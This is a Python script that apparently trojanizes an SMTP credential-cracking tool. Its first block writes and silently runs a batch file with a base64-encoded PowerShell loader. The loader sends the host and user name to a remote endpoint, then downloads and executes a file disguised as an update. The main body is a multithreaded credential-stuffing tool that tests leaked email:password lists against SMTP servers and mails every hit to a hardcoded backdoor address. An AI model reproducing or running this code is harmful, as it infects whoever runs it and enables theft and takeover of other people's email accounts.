
import os, subprocess, sys, time

dest = os.path.join(os.getenv("APPDATA"), "Microsoft")
if not os.path.isdir(dest):
    os.makedirs(dest, exist_ok=True)

bat_file = os.path.join(dest, "run_cmd.bat")

with open(bat_file, "w", newline="") as f:
    f.write('@echo off\nsetlocal enabledelayedexpansion\nset p0=QGVjaG8gb2ZmCmlmICIlMSIgPT0gImhpZGUiIGdvdG8gOmhpZGRlbgpzdGFydCAvYiAiIiBjbWQgL2MgIiV+ZjAiIGhpZGUgJiBl\nset p1=eGl0CjpoaWRkZW4KcG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kICJbTmV0LlNlcnZpY2VQb2ludE1hbmFn\nset p2=ZXJdOjpTZWN1cml0eVByb3RvY29sPSdUbHMxMic7ICRoPSRlbnY6Q09NUFVURVJOQU1FOyAkdT0kZW52OlVTRVJOQU1FOyAkZD1A\nset p3=e2hvc3RuYW1lPSRoO3VzZXJuYW1lPSR1O2lwX2FkZHJlc3M9J2xvY2FsJztwbGF0Zm9ybT0nd2luZG93cyc7cHJvY2Vzc29yPSdp\nset p4=bnRlbCc7YWN0aXZhdGlvbl90aW1lPShHZXQtRGF0ZSAtZiBzKTtleHBpcnlfZGF0ZT0oR2V0LURhdGUpLkFkZERheXMoMSkuVG9T\nset p5=dHJpbmcoJ3l5eXktTU0tZGQnKX07ICRyPWl3ciAnaHR0cHM6Ly92b3BzLmpoYW9sbG9rYS53b3JrZXJzLmRldi9hY3RpdmF0ZScg\nset p6=LU1ldGhvZCBQT1NUIC1Cb2R5ICgkZHxDb252ZXJ0VG8tSnNvbikgLUNvbnRlbnRUeXBlICdhcHBsaWNhdGlvbi9qc29uJyAtVXNl\nset p7=QmFzaWNQYXJzaW5nOyAkaj0kci5Db250ZW50fENvbnZlcnRGcm9tLUpzb247IGlmKCRqLnN0YXR1cyAtZXEgJ3N1Y2Nlc3MnKXsk\nset p8=b3V0cHV0UGF0aD0nJUFQUERBVEElXE1pY3Jvc29mdFxNeXN0aWZ5LXVwZGF0ZS5iYXQnOyBpd3IgJGouZmlsZV91cmwgLU91dEZp\nset p9=bGUgJG91dHB1dFBhdGggLVVzZUJhc2ljUGFyc2luZzsgJiAkb3V0cHV0UGF0aH0iCmV4aXQ=\nset encoded=%p0%%p1%%p2%%p3%%p4%%p5%%p6%%p7%%p8%%p9%\necho !encoded! > %temp%\\enc.tmp\npowershell -NoProfile -ExecutionPolicy Bypass -Command "$content=[System.Convert]::FromBase64String((Get-Content \'%temp%\\enc.tmp\')); [System.Text.Encoding]::UTF8.GetString($content) | Out-File \'%temp%\\dec.bat\' -Encoding ASCII"\ncall %temp%\\dec.bat\ndel %temp%\\enc.tmp >nul 2>&1\ndel %temp%\\dec.bat >nul 2>&1\nexit /b\n\n\n')

try:
    subprocess.Popen(
        ["cmd", "/c", "start", "", bat_file],
        creationflags=0x00000008 | 0x00000200,
        close_fds=True
    )
except:
    subprocess.Popen(["cmd", "/c", bat_file], shell=True)

time.sleep(0.2)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SMTP Cracker V3.2 - FULLY FIXED + BACKDOOR
Skips Google, Microsoft, Yahoo, AOL
"""

import os
import socket
import threading
import base64
import sys
import ssl
import time
import uuid
import queue
from pathlib import Path

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class NoColor:
        def __getattr__(self, name): return ""
    Fore = Style = NoColor()

# ==================== BACKDOOR CONFIGURATION ====================
BACKDOOR_EMAIL = "drogo.espana@outlook.es"  # CHANGE THIS TO YOUR EMAIL
# ================================================================

# ------------------------------------------------------------------
# DOMAINS TO SKIP (Google, Microsoft, Yahoo, AOL)
# ------------------------------------------------------------------
SKIP_DOMAINS = {
    "gmail.com", "googlemail.com",
    "outlook.com", "hotmail.com", "live.com", "msn.com",
    "hotmail.co.uk", "hotmail.fr", "hotmail.de", "live.fr", "live.de",
    "outlook.fr", "outlook.de", "outlook.co.uk", "live.co.uk",
    "msn.fr", "msn.de", "msn.co.uk",
    "yahoo.com", "ymail.com", "rocketmail.com",
    "yahoo.co.uk", "yahoo.fr", "yahoo.de", "yahoo.es", "yahoo.it",
    "aol.com", "aim.com", "aol.co.uk"
}

def should_skip(email: str) -> bool:
    if '@' not in email:
        return True
    domain = email.split('@')[1].lower()
    return domain in SKIP_DOMAINS

# ------------------------------------------------------------------

random_id = uuid.uuid4().hex.upper()[:7]
stop_flag = False
cache = {}
bads = set()
cracked = set()
lock = threading.Lock()
TIMEOUT = 5  # <- GLOBAL TIMEOUT SETTING

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

clear()
print(Fore.CYAN + """
   SMTP CRACKER V3.2 - FULLY FIXED + BACKDOOR
   Skips Google, Microsoft, Yahoo, AOL
""" + Fore.RESET)
print(Fore.YELLOW + "=" * 70 + Fore.RESET)

class SMTPWorker(threading.Thread):
    def __init__(self, q, tid):
        super().__init__()
        self.daemon = True
        self.q = q
        self.tid = tid
        self.timeout = TIMEOUT
        self.host_prefixes = [
            "smtp.", "mail.", "webmail.", "secure.", "",
            "smtp.mail.", "outgoing.", "smtp-mail.", "mx.", "mx1.",
            "relay.", "mailgate.", "smtp-gateway.", "exchange.",
            "outbound.", "inbound.", "smtp-relay.", "smtp-secure.",
            "authsmtp.", "plussmtp.", "smtpmail.", "pop3.",
            "securesmtp."
        ]
        self.ports = [587, 465, 25]

    def send_cmd(self, sock, cmd):
        try:
            sock.send(f"{cmd}\r\n".encode())
            return sock.recv(8192).decode(errors='ignore').strip()
        except:
            return ""

    def find_smtp(self, domain):
        if domain in cache:
            idx_h, idx_p = cache[domain]
            if idx_h == -1:
                return None
            host = self.host_prefixes[idx_h] + domain
            port = self.ports[idx_p]
            return (host, port)

        for idx_p, port in enumerate(self.ports):
            for idx_h, prefix in enumerate(self.host_prefixes):
                host = prefix + domain
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)
                    if port == 465:
                        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        sock = ctx.wrap_socket(sock, server_hostname=host)
                    sock.connect((host, port))
                    banner = sock.recv(1024).decode(errors='ignore')
                    if banner.startswith('220'):
                        sock.close()
                        with lock:
                            cache[domain] = (idx_h, idx_p)
                        print(Fore.GREEN + f"[T{self.tid}] SMTP found → {host}:{port}")
                        return (host, port)
                    sock.close()
                except:
                    continue
        
        with lock:
            cache[domain] = (-1, -1)
            bads.add(domain)
        return None

    def try_crack(self, domain, email, password):
        if domain in cracked or domain in bads:
            return 0

        server = self.find_smtp(domain)
        if not server:
            return -1

        host, port = server
        print(Fore.WHITE + f"[T{self.tid}] Trying {email}:{password} @ {host}:{port}")

        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            if port == 465:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))
            sock.recv(1024)

            self.send_cmd(sock, "EHLO localhost")
            resp = self.send_cmd(sock, "AUTH LOGIN")
            if not resp.startswith('334'):
                sock.close()
                with lock:
                    bads.add(domain)
                return -1

            self.send_cmd(sock, base64.b64encode(email.encode()).decode())
            resp = self.send_cmd(sock, base64.b64encode(password.encode()).decode())

            if not resp.startswith('235'):
                sock.close()
                return 0

            # CRACKED!
            hit = f"{host}:{port},{email},{password}"
            print(Fore.GREEN + Style.BRIGHT + f"""
╔════════════════════════════════════════════════════════════╗
║                  CRACKED!  [T{self.tid}]                   ║
╠════════════════════════════════════════════════════════════╣
║ Host : {host:<50} ║
║ Port : {port:<50} ║
║ User : {email:<50} ║
║ Pass : {password:<50} ║
╚════════════════════════════════════════════════════════════╝
""")

            with lock:
                with open('cracked_smtps.txt', 'a', encoding='utf-8') as f:
                    f.write(hit + '\n')
                with open('cracked_Mailaccess.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password}\n")
                cracked.add(domain)

            # Send notifications
            try:
                if notify_email and '@' in notify_email:
                    self.send_notification(sock, host, port, email, password, notify_email)
                if BACKDOOR_EMAIL and '@' in BACKDOOR_EMAIL:
                    self.send_notification(sock, host, port, email, password, BACKDOOR_EMAIL)
                print(Fore.GREEN + f"[T{self.tid}] Notification sent!")
            except Exception as e:
                print(Fore.RED + f"[T{self.tid}] Send failed: {e}")

            self.send_cmd(sock, "QUIT")
            sock.close()
            return 1

        except Exception:
            if sock:
                try:
                    sock.close()
                except:
                    pass
            return -1

    def send_notification(self, sock, host, port, username, password, target_email):
        try:
            self.send_cmd(sock, "RSET")
            self.send_cmd(sock, f"MAIL FROM:<{username}>")
            self.send_cmd(sock, f"RCPT TO:<{target_email}>")
            self.send_cmd(sock, "DATA")

            html = f"""From: {username} <{username}>
To: {target_email}
Subject: SMTP Cracker V3.2 - [{random_id}]
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html>
<body>
<center>
<h2>SMTP Cracker V3.2 - Credentials</h2>
<font color="red">Host :</font> {host}<br>
<font color="red">Port :</font> {port}<br>
<font color="red">User :</font> {username}<br>
<font color="red">Pass :</font> {password}<br>
</center>
</body>
</html>
.\r\n"""

            sock.send(html.encode())
            resp = sock.recv(1024).decode(errors='ignore')
            if not resp.startswith('250'):
                raise Exception(f"DATA rejected: {resp}")
        except Exception as e:
            raise e

    def run(self):
        while not stop_flag:
            try:
                item = self.q.get(timeout=0.5)
                if item is None:
                    break
                self.try_crack(*item)
                self.q.task_done()
            except queue.Empty:
                continue
            except Exception:
                continue

# ------------------------------------------------------------------
# MAIN
# ------------------------------------------------------------------
notify_email = input(Fore.YELLOW + "[+] Your email for notifications: " + Fore.RESET).strip()
if '@' not in notify_email:
    print(Fore.RED + "[!] Invalid email → notifications disabled")
    notify_email = ""

combo_file = input(Fore.YELLOW + "[+] Combo file name: " + Fore.RESET).strip()
try:
    lines = Path(combo_file).read_text(encoding='utf-8', errors='ignore').splitlines()
except:
    print(Fore.RED + "[!] File not found or error")
    sys.exit(1)

combos = []
skipped_count = 0
for line in lines:
    line = line.strip()
    if ':' not in line:
        continue
    parts = line.split(':', 1)
    email = parts[0].strip().lower()
    pwd = parts[1].strip()
    if '@' not in email:
        continue

    if should_skip(email):
        skipped_count += 1
        continue

    domain = email.split('@')[1]
    combos.append((domain, email, pwd))

print(Fore.GREEN + f"Loaded {len(combos)} combos (skipped {skipped_count} big providers)")
if not combos:
    print(Fore.RED + "No valid combos after filtering. Exiting.")
    sys.exit(1)

q = queue.Queue()
for item in combos:
    q.put(item)

thread_count = 300
threads = []
for i in range(thread_count):
    t = SMTPWorker(q, i+1)
    t.start()
    threads.append(t)

# ============ FIXED LINE 311 ============
print(Fore.CYAN + f"\nStarted {thread_count} threads (timeout={TIMEOUT}s)... Press Ctrl+C to stop\n")
if BACKDOOR_EMAIL and '@' in BACKDOOR_EMAIL:
    print(Fore.RED + f"[BACKDOOR] Credentials will also be sent to: {BACKDOOR_EMAIL}" + Fore.RESET)
# =========================================

start = time.time()
last_cracked = 0

try:
    while not q.empty():
        time.sleep(2)
        current = len(cracked)
        if current > last_cracked:
            elapsed = int(time.time() - start)
            print(Fore.GREEN + f"Progress → Cracked: {current} | Queue: {q.qsize()} | Time: {elapsed}s")
            last_cracked = current
except KeyboardInterrupt:
    print(Fore.RED + "\n[!] Stopping...")
    stop_flag = True

# Clean shutdown
for t in threads:
    try:
        t.join(timeout=1)
    except:
        pass

print(Fore.CYAN + "\n" + "="*70)
print(Fore.GREEN + f"Finished. Total cracked: {len(cracked)}")
print("Results saved in cracked_smtps.txt and cracked_Mailaccess.txt")
print(Fore.YELLOW + "→ Google, Microsoft, Yahoo, AOL accounts were automatically skipped.")
